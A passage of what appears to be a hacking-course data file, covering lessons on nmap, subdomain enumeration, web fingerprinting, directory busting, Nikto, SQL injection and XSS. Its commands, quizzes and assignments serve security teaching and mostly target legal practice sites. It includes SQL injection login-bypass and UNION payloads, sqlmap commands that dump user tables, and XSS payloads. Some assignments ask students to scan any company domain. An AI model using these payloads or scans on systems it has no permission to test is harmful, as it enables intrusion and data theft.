assignment:{title:"DNS Enumeration Report",tasks:["Pick any company website","Run whois — note registrar, dates, nameservers","Run dig for A, MX, NS, TXT records","Attempt zone transfer (will probably fail)","Run dnsrecon and save to file"],submit:"Organized notes from all tools"}},

{id:12,title:"Nmap — Port Scanning",emoji:"🔭",subtitle:"Find what is open and what is running.",type:"system",phase:2,month:2,points:60,duration_mins:70,
intro:"Nmap is the most famous hacking tool. It finds open ports and services. Every pentest starts with nmap. Only use it on systems you have permission to scan.",
sections:[
{title:"First Nmap Scan",steps:["Default scan checks top 1000 ports","Shows port state and service","States: open, closed, filtered"],
cmd:[{t:"cmd",v:"nmap 192.168.1.1"},{t:"out",v:"Nmap scan report for 192.168.1.1\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n443/tcp  open   https"}]},
{title:"Scan Options",steps:["Specify ports with -p","Scan all ports with -p-","Scan subnet with /24","Save with -oN"],
cmd:[{t:"cmd",v:"nmap -p 22,80,443 192.168.1.1"},{t:"cmd",v:"nmap -p 1-1000 192.168.1.1"},{t:"cmd",v:"nmap -p- 192.168.1.1"},{t:"cmd",v:"nmap 192.168.1.0/24"},{t:"cmd",v:"nmap 192.168.1.1 -oN results.txt"}]},
{title:"Legal Practice Target",steps:["scanme.nmap.org is set up for practice","100% legal to scan","Try all your nmap commands here"],
cmd:[{t:"cmd",v:"nmap scanme.nmap.org"},{t:"out",v:"Nmap scan report for scanme.nmap.org\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n9929/tcp  open  nping-echo"}]},
{title:"Version Detection",steps:["nmap -sV detects service versions","nmap -A does full scan","nmap -O detects OS"],
cmd:[{t:"cmd",v:"nmap -sV scanme.nmap.org"},{t:"out",v:"22/tcp open  ssh  OpenSSH 6.6.1p1\n80/tcp open  http Apache httpd 2.4.7"},{t:"cmd",v:"nmap -A scanme.nmap.org"},{t:"cmd",v:"nmap -sS -sV -O -T4 target.com -oA full-scan"}]}
],
hints:["nmap -p- scans all 65535 ports but is slow. Use -p 1-1000 first.","scanme.nmap.org is 100% legal to scan — set up by nmap creators"],
quiz:[{q:"filtered means in nmap?",opts:["Port open","Port closed","Firewall blocking probe","Port does not exist"],a:2},{q:"Flag to scan all 65535 ports?",opts:["-a","-p 65535","-p-","-all"],a:2},{q:"Flag to save as text file?",opts:["-oT","-oN","-oS","-oA"],a:1},{q:"Legal practice target?",opts:["google.com","scanme.nmap.org","facebook.com","amazon.com"],a:1},{q:"192.168.1.0/24 means?",opts:["Single IP","Top 24 ports","All IPs 192.168.1.1-254","24 random hosts"],a:2}],
assignment:{title:"Nmap Scan Report",tasks:["Scan scanme.nmap.org with default settings","Scan again with -p 1-10000","Save results to file","List all open ports and services","Scan your router too"],submit:"nmap output files and analysis"}},

{id:13,title:"Nmap Advanced + NSE Scripts",emoji:"🔬",subtitle:"OS detection, versions, and vulnerability scripts.",type:"system",phase:2,month:2,points:60,duration_mins:70,
intro:"Basic nmap finds open ports. Advanced nmap finds software versions and checks for vulnerabilities using scripts.",
sections:[
{title:"Service Versions -sV",steps:["-sV connects and reads what service announces","Gives exact version numbers","Search CVEs for those versions"],
cmd:[{t:"cmd",v:"nmap -sV scanme.nmap.org"},{t:"out",v:"22/tcp open  ssh  OpenSSH 6.6.1p1 Ubuntu\n80/tcp open  http Apache httpd 2.4.7"},{t:"c",v:"Now search: OpenSSH 6.6.1 CVE"},{t:"c",v:"And: Apache 2.4.7 exploit"}]},
{title:"OS Detection -O",steps:["-O guesses the operating system","-A does everything at once","Combine with version detection"],
cmd:[{t:"cmd",v:"nmap -O 192.168.1.1"},{t:"out",v:"OS details: Linux 2.6.32 - 3.10"},{t:"cmd",v:"nmap -A scanme.nmap.org"},{t:"out",v:"(Runs: -sV -O -sC --traceroute)"}]},
{title:"NSE Scripts",steps:["NSE = Nmap Scripting Engine","Run default: -sC","Run vulnerability: --script=vuln","Scripts stored in /usr/share/nmap/scripts/"],
cmd:[{t:"cmd",v:"nmap -sC 192.168.1.1"},{t:"cmd",v:"nmap --script=vuln target.com"},{t:"cmd",v:"nmap --script=http-headers target.com"},{t:"cmd",v:"nmap --script=http-title target.com"},{t:"cmd",v:"ls /usr/share/nmap/scripts/ | head -20"}]},
{title:"Timing and Stealth",steps:["T0-T5 controls speed","T3 is default","T4 is good for labs","T0 is very slow, evades detection"],
cmd:[{t:"c",v:"T0=Paranoid T1=Sneaky T2=Polite"},{t:"c",v:"T3=Normal T4=Aggressive T5=Insane"},{t:"cmd",v:"nmap -sS -T2 target.com"},{t:"cmd",v:"nmap -sS -sV -O -T4 -p- target.com -oA full"}]}
],
hints:["nmap -A is all-in-one: OS + versions + scripts + traceroute. Noisy but thorough.","Search CVEdetails.com or nvd.nist.gov for version numbers nmap finds"],
quiz:[{q:"nmap -sV does?",opts:["Verbose output","Detects service versions","Scans all ports","Stealth scan"],a:1},{q:"nmap -A includes?",opts:["Only port scan","OS detection + versions + scripts","Just scripts","Just OS"],a:1},{q:"Which timing is most aggressive?",opts:["T0","T3","T4","T5"],a:3},{q:"nmap -sS does?",opts:["Service scan","Save scan","SYN stealth scan","Script scan"],a:2},{q:"NSE scripts are in?",opts:["/usr/bin/nmap/scripts","/etc/nmap/","/usr/share/nmap/scripts","/opt/nmap/nse"],a:2}],
assignment:{title:"Advanced Nmap",tasks:["nmap -sV on scanme.nmap.org, record all versions","nmap -A full output","Search CVEs for one version you found","Run default scripts -sC"],submit:"Full nmap output and CVE research"}},

{id:14,title:"Subdomain Enumeration",emoji:"🌳",subtitle:"Find hidden subdomains that expand your attack surface.",type:"web",phase:2,month:2,points:60,duration_mins:65,
intro:"Main websites are well protected. But dev., staging., api. subdomains are often not. Finding all subdomains gives you more targets to test.",
sections:[
{title:"Sublist3r",steps:["Searches multiple search engines","Passive — does not touch target directly","Save results to file"],
cmd:[{t:"cmd",v:"pip3 install sublist3r"},{t:"cmd",v:"sublist3r -d example.com"},{t:"out",v:"www.example.com\nmail.example.com\ndev.example.com"},{t:"cmd",v:"sublist3r -d example.com -o subs.txt"}]},
{title:"Amass",steps:["More powerful than Sublist3r","Uses more sources","Active and passive modes"],
cmd:[{t:"cmd",v:"apt install -y amass"},{t:"cmd",v:"amass enum -passive -d example.com"},{t:"out",v:"api.example.com\nstaging.example.com\nvpn.example.com"},{t:"cmd",v:"amass enum -passive -d example.com -o amass.txt"}]},
{title:"crt.sh — Certificate Logs",steps:["SSL certificates are public","crt.sh searches certificate transparency logs","Very powerful — completely passive"],
cmd:[{t:"c",v:"Go to browser: https://crt.sh/?q=%.example.com"},{t:"c",v:"This shows ALL certificates ever issued for *.example.com"},{t:"cmd",v:"curl 'https://crt.sh/?q=%.example.com&output=json' | python3 -m json.tool | grep name_value | sort -u"}]},
{title:"Check Which Are Alive",steps:["After finding subdomains, check which respond","Dead ones waste time","Use curl or ping loop"],
cmd:[{t:"cmd",v:"for sub in $(cat subs.txt); do ping -c 1 $sub &>/dev/null && echo \"ALIVE: $sub\"; done"},{t:"cmd",v:"apt install -y httpx-toolkit"},{t:"cmd",v:"cat subs.txt | httpx-toolkit"},{t:"out",v:"https://www.example.com [200]\nhttps://api.example.com [302]\nhttps://dev.example.com [401]"}]}
],
hints:["crt.sh is one of the best tools — companies cannot hide from certificate transparency logs","dev. staging. admin. api. vpn. are the most valuable subdomains"],
quiz:[{q:"Why are subdomains important?",opts:["Different colors","Often less protected","Always vulnerable","Contain passwords"],a:1},{q:"sublist3r -d does?",opts:["DNS lookup","Finds subdomains","Deep scan","Downloads site"],a:1},{q:"crt.sh searches?",opts:["SSL only","Certificate transparency logs for subdomains","Port scanning","Emails"],a:1},{q:"HTTP 401 on subdomain means?",opts:["Not found","Server error","Authentication required","Redirects"],a:2},{q:"Most interesting subdomain prefix?",opts:["www","static","cdn","dev"],a:3}],
assignment:{title:"Subdomain Map",tasks:["Run sublist3r on a company domain","Run amass passive on same domain","Query crt.sh in browser","Combine results, remove duplicates: sort -u","Try connecting to 5 subdomains, note status codes"],submit:"Combined subdomain list and alive check results"}},

{id:15,title:"Web Fingerprinting",emoji:"🕵️",subtitle:"Identify what technology a website uses.",type:"web",phase:2,month:2,points:60,duration_mins:60,
intro:"Before testing a web app, know what it is built with. PHP has different vulnerabilities than Python. WordPress needs different tests than a custom app.",
sections:[
{title:"Headers Reveal Everything",steps:["curl -I gets headers","Server: = web server type","X-Powered-By: = backend language","Missing headers = potential vulnerabilities"],
cmd:[{t:"cmd",v:"curl -I https://target.com"},{t:"out",v:"Server: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.24\nSet-Cookie: PHPSESSID=abc123"},{t:"c",v:"Apache 2.4.29 → check CVEs for this version"},{t:"c",v:"PHP/7.2.24 → End of Life, many known bugs"},{t:"c",v:"PHPSESSID → confirms PHP backend"}]},
{title:"WhatWeb",steps:["WhatWeb automates fingerprinting","Shows all detected technologies","Use -v for more detail"],
cmd:[{t:"cmd",v:"apt install -y whatweb"},{t:"cmd",v:"whatweb target.com"},{t:"out",v:"Apache[2.4.29], Bootstrap[3.4.1], PHP[7.2.24], WordPress[5.8.1]"},{t:"cmd",v:"whatweb -v target.com"},{t:"cmd",v:"whatweb -a 3 target.com"}]},
{title:"Find CMS",steps:["WordPress: /wp-content/ and /wp-includes/","Joomla: /components/ and option=com_","Check generator meta tag","Check robots.txt for hidden paths"],
cmd:[{t:"cmd",v:"curl -s https://target.com | grep -i 'wp-content\\|wp-includes'"},{t:"out",v:"<link href='/wp-content/themes/...'>"},{t:"cmd",v:"curl -s https://target.com | grep -i 'generator'"},{t:"out",v:"<meta name=\"generator\" content=\"WordPress 5.8.1\">"},{t:"cmd",v:"curl https://target.com/robots.txt"}]},
{title:"Online Fingerprint Tools",steps:["Wappalyzer.com — full tech stack","BuiltWith.com — hosting, analytics, frameworks","SecurityHeaders.com — missing security headers"],
cmd:[{t:"c",v:"https://www.wappalyzer.com → type any URL"},{t:"c",v:"https://builtwith.com → shows all technologies"},{t:"c",v:"https://securityheaders.com → shows missing headers"},{t:"c",v:"Missing headers = potential vulnerabilities"},{t:"cmd",v:"curl -I https://target.com | grep -iE 'server|php|powered|cms'"}]}
],
hints:["robots.txt lists paths the owner does NOT want indexed — like /admin, /backup — exactly what attackers want","WordPress always has /wp-login.php — if you find WordPress, check if that file exists"],
quiz:[{q:"X-Powered-By: PHP/7.2 tells you?",opts:["Site speed","Backend language and version","Database type","SSL cert"],a:1},{q:"WhatWeb does?",opts:["Port scanning","Automatically identifies web technologies","Directory busting","Password cracking"],a:1},{q:"robots.txt is useful because?",opts:["Blocks hackers","Lists paths owner does not want indexed","Shows passwords","Shows IPs"],a:1},{q:"WordPress files are in?",opts:["/joomla/","/drupal/","/wp-content/","/cms/"],a:2},{q:"Missing Content-Security-Policy can lead to?",opts:["SQL injection","XSS attacks","Directory traversal","Brute force"],a:1}],
assignment:{title:"Tech Fingerprint Report",tasks:["Pick 3 different websites","For each: curl -I, WhatWeb, check robots.txt","Identify: server, language, CMS","Check which security headers are missing","Write fingerprint summary for each"],submit:"Table comparing all 3 sites"}},

{id:16,title:"Directory Busting",emoji:"📂",subtitle:"Find hidden pages that are not linked anywhere.",type:"web",phase:2,month:2,points:60,duration_mins:65,
intro:"Websites have files not linked from any page — admin panels, backup files, old pages. Directory busting guesses these using a wordlist.",
sections:[
{title:"Dirb",steps:["Classic directory busting tool","Simple to use","Default wordlist at /usr/share/dirb/wordlists/common.txt"],
cmd:[{t:"cmd",v:"apt install -y dirb"},{t:"cmd",v:"dirb http://testphp.vulnweb.com"},{t:"out",v:"+ http://target.com/admin  (CODE:200|SIZE:1234)\n+ http://target.com/login  (CODE:200|SIZE:567)\n+ http://target.com/backup.zip (CODE:200|SIZE:98765)"},{t:"cmd",v:"dirb http://target.com -o results.txt"}]},
{title:"Gobuster (Faster)",steps:["Gobuster is faster — uses threads","Use -t to set threads","Use -x to find specific extensions"],
cmd:[{t:"cmd",v:"apt install -y gobuster"},{t:"cmd",v:"gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt"},{t:"out",v:"/admin  (Status: 200)\n/login  (Status: 200)\n/config.php (Status: 403)"},{t:"cmd",v:"gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,html,txt,bak"}]},
{title:"Wordlists",steps:["Install SecLists for best wordlists","Common.txt for quick scan","Big.txt or raft for thorough scan"],
cmd:[{t:"cmd",v:"apt install -y seclists"},{t:"c",v:"/usr/share/seclists/Discovery/Web-Content/common.txt"},{t:"c",v:"/usr/share/seclists/Discovery/Web-Content/big.txt"},{t:"c",v:"/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"},{t:"cmd",v:"gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt"}]},
{title:"What To Do With Results",steps:["200 = page exists, open it","403 = exists but blocked","301/302 = redirect, follow it","Found backup files? Download them","Found .git? Get source code"],
cmd:[{t:"cmd",v:"curl http://target.com/admin"},{t:"cmd",v:"wget http://target.com/backup.zip"},{t:"cmd",v:"curl -L http://target.com/old"},{t:"c",v:"Found /.git? Download source code:"},{t:"cmd",v:"wget -r http://target.com/.git/"}]}
],
hints:["Status 403 means file EXISTS but blocked. Still confirms the path exists.","Always check: /.git, /.env, /backup, /config — most common high-value finds"],
quiz:[{q:"Directory busting does?",opts:["Scans ports","Guesses hidden files using wordlist","Finds emails","Cracks passwords"],a:1},{q:"Faster tool for directory busting?",opts:["Dirb","Gobuster","Nmap","Nikto"],a:1},{q:"Gobuster threads flag?",opts:["-w","-u","-t","-x"],a:2},{q:"SecLists is?",opts:["Kali tool","Collection of wordlists","Scanner","CMS"],a:1},{q:"Exposed .git folder means?",opts:["Delete database","Get source code","Change homepage","Crash server"],a:1}],
assignment:{title:"Directory Discovery",tasks:["Practice on: http://testphp.vulnweb.com","Run dirb with common wordlist","Run gobuster with -x php,txt,bak","List all pages found with 200","Access 3 found pages and describe what you see"],submit:"Full gobuster/dirb output and notes"}},

{id:17,title:"Banner Grabbing",emoji:"🏷️",subtitle:"Find exact software versions running on a system.",type:"system",phase:2,month:2,points:60,duration_mins:55,
intro:"Banner grabbing connects to a service and reads what it announces. Many services say exactly what they are and what version they run.",
sections:[
{title:"Netcat Banner Grabbing",steps:["nc connects to any port","Services announce themselves","SSH always shows version immediately"],
cmd:[{t:"cmd",v:"apt install -y netcat-openbsd"},{t:"cmd",v:"nc target.com 80"},{t:"c",v:"Then type: HEAD / HTTP/1.0 and press Enter twice"},{t:"out",v:"Server: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.24"},{t:"cmd",v:"nc target.com 22"},{t:"out",v:"SSH-2.0-OpenSSH_7.2p2 Ubuntu"}]},
{title:"Telnet Banner Grabbing",steps:["telnet works for many protocols","FTP announces version immediately","SMTP announces email server"],
cmd:[{t:"cmd",v:"apt install -y telnet"},{t:"cmd",v:"telnet target.com 21"},{t:"out",v:"220 ProFTPD 1.3.5e Server (Debian)"},{t:"cmd",v:"telnet target.com 25"},{t:"out",v:"220 mail.target.com ESMTP Postfix (Ubuntu)"}]},
{title:"Nmap for All Services",steps:["nmap -sV grabs banners automatically","Scans all specified ports","Saves you typing"],
cmd:[{t:"cmd",v:"nmap -sV -p 21,22,25,80,443 target.com"},{t:"out",v:"21/tcp open  ftp  ProFTPD 1.3.5e\n22/tcp open  ssh  OpenSSH 7.2p2\n80/tcp open  http Apache httpd 2.4.29"}]},
{title:"Search for CVEs",steps:["Once you have a version, search for known bugs","Use Exploit-DB, NVD, or Google","Look for remote exploits"],
cmd:[{t:"c",v:"Best places:"},{t:"c",v:"https://nvd.nist.gov/vuln/search"},{t:"c",v:"https://www.exploit-db.com"},{t:"c",v:"https://www.cvedetails.com"},{t:"c",v:"Google: ProFTPD 1.3.5 exploit"},{t:"c",v:"Filter: Remote exploits (can be run from anywhere)"}]}
],
hints:["OpenSSH shows version immediately on port 22 — no password needed. Quick fingerprinting.","Exploit-DB lets you filter by platform and type. Look for 'remote' exploits."],
quiz:[{q:"What is banner grabbing?",opts:["Download banners","Read what service announces on connect","Scan all ports","Find directories"],a:1},{q:"Netcat (nc) does?",opts:["Network scanner","Connects to any TCP/UDP port","Password cracker","File downloader"],a:1},{q:"SSH version appears when?",opts:["After login","After password","Immediately on connect","Never"],a:2},{q:"Search for exploits by version at?",opts:["Google Maps","Exploit-DB","WhatsApp","LinkedIn"],a:1},{q:"CVE stands for?",opts:["Common Vulnerability Enumeration","Common Vulnerabilities and Exposures","Cyber Vulnerability Exchange","Critical Vulnerability Entry"],a:1}],
assignment:{title:"Service Enumeration",tasks:["nmap -sV on scanme.nmap.org","Record all service versions","Search Exploit-DB for 2 versions you found","Practice nc on ports 22 and 80","Write what each service is and any CVEs"],submit:"nmap output and CVE research summary"}},

{id:18,title:"Nikto — Web Scanner",emoji:"🕷️",subtitle:"Auto-scan websites for common vulnerabilities.",type:"web",phase:2,month:2,points:60,duration_mins:60,
intro:"Nikto checks a website for thousands of known issues automatically. Good for quick checks before manual testing.",
sections:[
{title:"Install and Basic Scan",steps:["Install nikto","Scan a test site","Read the output"],
cmd:[{t:"cmd",v:"apt install -y nikto"},{t:"cmd",v:"nikto -h http://testphp.vulnweb.com"},{t:"out",v:"+ Server: Apache/2.4.7\n+ X-Powered-By: PHP/5.5.9\n+ X-Frame-Options header not present\n+ /phpmyadmin/ found\n+ 12 items reported"},{t:"c",v:"testphp.vulnweb.com is a LEGAL test target"}]},
{title:"Reading the Output",steps:["Each line is something to investigate","Look for: old versions, exposed panels, missing headers"],
cmd:[{t:"c",v:"Apache/2.4.7 → old version, check CVEs"},{t:"c",v:"PHP/5.5.9 → very old, many known bugs"},{t:"c",v:"X-Frame-Options missing → clickjacking possible"},{t:"c",v:"/phpmyadmin/ → database admin exposed"},{t:"c",v:"/admin/ → admin panel found"},{t:"c",v:"/backup/ → backup files possibly accessible"},{t:"cmd",v:"nikto -h http://target.com -o nikto.txt"}]},
{title:"Nikto Options",steps:["Scan HTTPS with -ssl","Scan specific port with -p","Choose scan types with -Tuning"],
cmd:[{t:"cmd",v:"nikto -h https://target.com -ssl"},{t:"cmd",v:"nikto -h target.com -p 8080"},{t:"cmd",v:"nikto -h target.com -Tuning 9"},{t:"c",v:"Tuning: 1=interesting files 2=config 4=injection 9=SQL"}]},
{title:"Nikto Limitations",steps:["Nikto does NOT exploit vulnerabilities","Very noisy — leaves logs everywhere","Has false positives","Misses custom vulnerabilities"],
cmd:[{t:"c",v:"Nikto CANNOT:"},{t:"c",v:"Exploit vulnerabilities (just finds them)"},{t:"c",v:"Scan JS-heavy sites well"},{t:"c",v:"Find business logic flaws"},{t:"c",v:"Nikto IS good for:"},{t:"c",v:"Quick automated check of common issues"},{t:"c",v:"Finding outdated software"},{t:"c",v:"Spotting missing security headers"}]}
],
hints:["testphp.vulnweb.com is permanently vulnerable — set up by Acunetix for practice","Run nikto in background: nikto -h target.com -o results.txt &"],
quiz:[{q:"Nikto does?",opts:["Exploits vulnerabilities","Scans websites for known issues","Cracks passwords","Sniffs traffic"],a:1},{q:"HTTPS flag in Nikto?",opts:["-https","-ssl","-secure","-tls"],a:1},{q:"Why is Nikto noisy?",opts:["Too much sound","Leaves obvious logs, many requests","Downloads too much","Sends spam"],a:1},{q:"False positive means?",opts:["Real vulnerability","Reported vulnerable but actually safe","Missed vulnerability","Confirmed exploit"],a:1},{q:"Good legal target for Nikto practice?",opts:["facebook.com","testphp.vulnweb.com","amazon.com","google.com"],a:1}],
assignment:{title:"Nikto Scan Report",tasks:["Run Nikto on http://testphp.vulnweb.com","Save output to nikto.txt","List top 5 most serious findings","For each: explain what it means and the risk","Note 2 things Nikto cannot find"],submit:"nikto.txt and your analysis of top 5 findings"}},

{id:19,title:"Manual Web Testing",emoji:"✍️",subtitle:"Test web apps by hand — find what scanners miss.",type:"web",phase:2,month:2,points:60,duration_mins:70,
intro:"Automated scanners find common issues. Manual testing finds everything else — logic flaws and unique bugs. This is what separates amateurs from professionals.",
sections:[
{title:"Map the Application",steps:["Find every page, form, and input","Use curl and grep to discover structure","Map before testing"],
cmd:[{t:"cmd",v:"curl -s http://testphp.vulnweb.com | grep -i 'form\\|input\\|action\\|href'"},{t:"cmd",v:"curl -s http://testphp.vulnweb.com | grep -oP 'href=\"[^\"]*\"' | sort -u"},{t:"cmd",v:"curl -s http://testphp.vulnweb.com | grep -i '<input'"}]},
{title:"Testing Login Forms",steps:["Try default credentials","Check error messages for username enumeration","Test with special characters"],
cmd:[{t:"cmd",v:"curl -X POST http://testphp.vulnweb.com/login.php -d 'uname=admin&pass=admin'"},{t:"c",v:"Wrong password = username exists (enumeration)"},{t:"c",v:"User not found = username does not exist"},{t:"c",v:"Common defaults: admin:admin, admin:password, root:root"},{t:"cmd",v:"curl -c cookies.txt -X POST http://target.com/login -d 'user=admin&pass=admin'"},{t:"cmd",v:"curl -b cookies.txt http://target.com/admin"}]},
{title:"Testing Input Fields",steps:["Every input is a potential vulnerability","Test URL parameters with special characters","Check for SQL injection, XSS, path traversal"],
cmd:[{t:"cmd",v:"curl 'http://testphp.vulnweb.com/listproducts.php?cat=1'"},{t:"cmd",v:"curl 'http://testphp.vulnweb.com/listproducts.php?cat=1%27'"},{t:"c",v:"%27 = URL-encoded single quote"},{t:"c",v:"SQL error = injectable!"},{t:"cmd",v:"curl 'http://target.com/search?q=<script>alert(1)</script>'"},{t:"c",v:"<script> in response = XSS possible"}]},
{title:"Testing APIs",steps:["Find API endpoints with gobuster","Test GET endpoints","Change parameter values","IDOR = changing id to see others data"],
cmd:[{t:"cmd",v:"gobuster dir -u http://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt"},{t:"cmd",v:"curl http://target.com/api/user?id=1"},{t:"cmd",v:"curl http://target.com/api/user?id=2"},{t:"c",v:"If id=2 shows another user's data = IDOR vulnerability"}]}
],
hints:["URL encode chars: '=%27  \"=%22  <==%3C","IDOR is one of the most common API bugs — try changing id parameter to see other users data"],
quiz:[{q:"IDOR vulnerability means?",opts:["SQL in ID field","Access another user's data by changing object ID","HTML injection","Denying access"],a:1},{q:"Username enumeration matters because?",opts:["Reveals passwords","Confirms valid usernames for brute force","Gives admin access","Bypasses 2FA"],a:1},{q:"%27 in URL tests for?",opts:["XSS","Path traversal","SQL injection","Command injection"],a:2},{q:"Save cookies with curl?",opts:["-s cookies.txt","-c cookies.txt","-save-cookies","-cookie"],a:1},{q:"Before testing any input field?",opts:["Inject payloads immediately","Map all pages first","Run Nikto","Start brute force"],a:1}],
assignment:{title:"Manual Testing",tasks:["Go to: http://testphp.vulnweb.com","Map all pages and forms using curl","Submit login with admin:admin, check error","Find URL parameter and add single quote","Note what happens"],submit:"Notes from each test: what sent, response received, what it means"}},

{id:20,title:"Full Recon Exercise",emoji:"📊",subtitle:"Put everything together. One complete recon report.",type:"web",phase:2,month:2,points:75,duration_mins:90,
intro:"Month 2 final exercise. Use every tool from Levels 11-19 on one target. Produce a complete recon report like a real professional.",
sections:[
{title:"Set Up Workspace",steps:["Create organized folders","Set target variable","Work systematically"],
cmd:[{t:"cmd",v:"mkdir -p ~/recon/{dns,ports,web,notes}"},{t:"cmd",v:"cd ~/recon"},{t:"cmd",v:"TARGET='testphp.vulnweb.com'"},{t:"c",v:"Use $TARGET in all commands"}]},
{title:"DNS and WHOIS Phase",steps:["Run whois","Run dig for all record types","Run dnsrecon"],
cmd:[{t:"cmd",v:"whois $TARGET > dns/whois.txt"},{t:"cmd",v:"dig $TARGET ANY > dns/dig.txt"},{t:"cmd",v:"dnsrecon -d $TARGET > dns/dnsrecon.txt"},{t:"ok",v:"DNS phase complete."}]},
{title:"Port and Subdomain Phase",steps:["Run sublist3r","Run nmap full scan","Save all results"],
cmd:[{t:"cmd",v:"sublist3r -d $TARGET -o ports/subdomains.txt"},{t:"cmd",v:"nmap -sV -p 1-1000 $TARGET -oN ports/nmap.txt"},{t:"ok",v:"Port phase complete."}]},
{title:"Web Phase and Report",steps:["Run WhatWeb, Nikto, Gobuster","Write organized report","Analyze most interesting findings"],
cmd:[{t:"cmd",v:"whatweb $TARGET > web/whatweb.txt"},{t:"cmd",v:"nikto -h http://$TARGET -o web/nikto.txt"},{t:"cmd",v:"gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o web/dirs.txt"},{t:"cmd",v:"curl -I http://$TARGET > web/headers.txt"},{t:"cmd",v:"nano notes/report.txt"}]}
],
hints:["Organize everything. A messy recon phase means you miss things.","Most Interesting Findings section is most important — shows you understand what you found"],
quiz:[{q:"First step of any recon?",opts:["Run nmap immediately","Set up organized workspace","Run nikto","Send phishing"],a:1},{q:"Which phase comes first?",opts:["Port scanning","Web scanning","DNS and WHOIS","Directory busting"],a:2},{q:"What goes in Most Interesting Findings?",opts:["Everything found","Your analysis of most important issues","Just CVEs","Only open ports"],a:1},{q:"$TARGET means when TARGET=domain.com?",opts:["File named TARGET","Value of TARGET variable","Bash command","IP address"],a:1},{q:"Why save all tool output to files?",opts:["Waste disk space","Review and report later","Tools require it","For backup"],a:1}],
assignment:{title:"Month 2 Final Recon Report",tasks:["Complete all 4 phases","All output saved in organized folders","Written report with all sections","Your own analysis of most interesting findings","One recommendation for Month 3 testing"],submit:"Full recon folder as zip OR each file individually with written report"}},

{id:21,title:"SQL Injection",emoji:"💉",subtitle:"Manipulate databases through vulnerable inputs.",type:"web",phase:3,month:3,points:75,duration_mins:75,
intro:"SQL injection works because web apps build queries using user input without cleaning it first. If you can inject SQL, you can read the database, bypass login, and sometimes run server commands.",
sections:[
{title:"How SQL Injection Works",steps:["Normal login query uses your input directly","Adding a single quote breaks the query","' OR 1=1 -- makes the condition always true"],
cmd:[{t:"c",v:"Normal query: SELECT * FROM users WHERE username='admin' AND password='pass'"},{t:"c",v:"With ' OR 1=1 --:"},{t:"c",v:"SELECT * FROM users WHERE username='' OR 1=1 --' AND password=''"},
{t:"c",v:"1=1 = always true → returns ALL users → login bypassed"},{t:"c",v:"admin'-- comments out the password check"}]},
{title:"Finding SQL Injection",steps:["Test every parameter with a single quote","SQL error = injectable","Test login forms with bypass payloads"],
cmd:[{t:"cmd",v:"curl 'http://testphp.vulnweb.com/listproducts.php?cat=1%27'"},{t:"out",v:"Warning: mysql_fetch_array() — SQL ERROR!"},{t:"c",v:"SQL error = SQL injection confirmed"},{t:"cmd",v:"curl -X POST http://testphp.vulnweb.com/login.php -d \"uname=admin'--&pass=anything\""}]},
{title:"Extract Data with UNION",steps:["Find number of columns with ORDER BY","Use UNION SELECT to get data from other tables"],
cmd:[{t:"cmd",v:"curl 'http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 8--'"},{t:"c",v:"Keep increasing until error — tells you column count"},{t:"cmd",v:"curl 'http://testphp.vulnweb.com/listproducts.php?cat=0 UNION SELECT 1,username,password,4,5,6,7,8 FROM users--'"}]},
{title:"SQLMap",steps:["SQLMap automates SQL injection","Finds and exploits automatically","Can dump entire database"],
cmd:[{t:"cmd",v:"apt install -y sqlmap"},{t:"cmd",v:"sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1'"},{t:"out",v:"[INFO] parameter 'cat' is injectable"},{t:"cmd",v:"sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' --dbs"},{t:"cmd",v:"sqlmap -u '...' -D acuart --tables"},{t:"cmd",v:"sqlmap -u '...' -D acuart -T users --dump"}]}
],
hints:["Start with single quote ' always. SQL error = injectable.","SQLMap --level 5 --risk 3 is more aggressive but slower. Start with defaults."],
quiz:[{q:"Test character for SQL injection?",opts:["*","!","'","#"],a:2},{q:"' OR 1=1 -- does?",opts:["Crashes DB","Makes WHERE always true","Drops tables","Encrypts query"],a:1},{q:"-- in SQL does?",opts:["Adds string","Comments out everything after","Marks end","Creates table"],a:1},{q:"SQLMap --dbs gets?",opts:["Tables","All databases","Dump data","User list"],a:1},{q:"SQL injection prevention?",opts:["Use HTTPS","Prepared statements","Strong passwords","Rate limiting"],a:1}],
assignment:{title:"SQL Injection Exercise",tasks:["Go to: http://testphp.vulnweb.com/listproducts.php?cat=1","Manually confirm SQL injection with single quote","Run sqlmap and dump the users table","Document: how confirmed, what DB found, data extracted","Explain how to prevent it"],submit:"sqlmap output showing dumped data + prevention explanation"}},

{id:22,title:"XSS — Cross Site Scripting",emoji:"🎭",subtitle:"Inject JavaScript into websites to attack other users.",type:"web",phase:3,month:3,points:75,duration_mins:70,
intro:"XSS lets you inject JavaScript into a website. That script runs in other users' browsers. It can steal cookies, redirect users, or deface the site.",
sections:[
{title:"3 Types of XSS",steps:["Reflected XSS = your input reflected back immediately","Stored XSS = saved in database, affects all visitors","DOM XSS = JavaScript reads input and writes to DOM"],
cmd:[{t:"c",v:"REFLECTED: search?q=<script>alert(1)</script>"},{t:"c",v:"Only runs for the person who clicks the link"},{t:"c",v:""},{t:"c",v:"STORED (most dangerous): comment with <script>"},{t:"c",v:"Runs for EVERY user who visits the page"},{t:"c",v:""},{t:"c",v:"DOM: JS reads URL and writes it without sanitizing"}]},
{title:"Testing for XSS",steps:["Basic payload: <script>alert(1)</script>","Check if it appears unchanged in response","Try alternative payloads if filtered"],
cmd:[{t:"cmd",v:"curl -s 'http://testphp.vulnweb.com/search.php?test=<script>alert(1)</script>' | grep script"},{t:"out",v:"<script>alert(1)</script>"},{t:"c",v:"Appears unchanged = XSS!"},{t:"c",v:"Alternative payloads (if basic is filtered):"},{t:"c",v:"<img src=x onerror=alert(1)>"},{t:"c",v:"<svg onload=alert(1)>"},{t:"c",v:"<body onload=alert(1)>"}]},
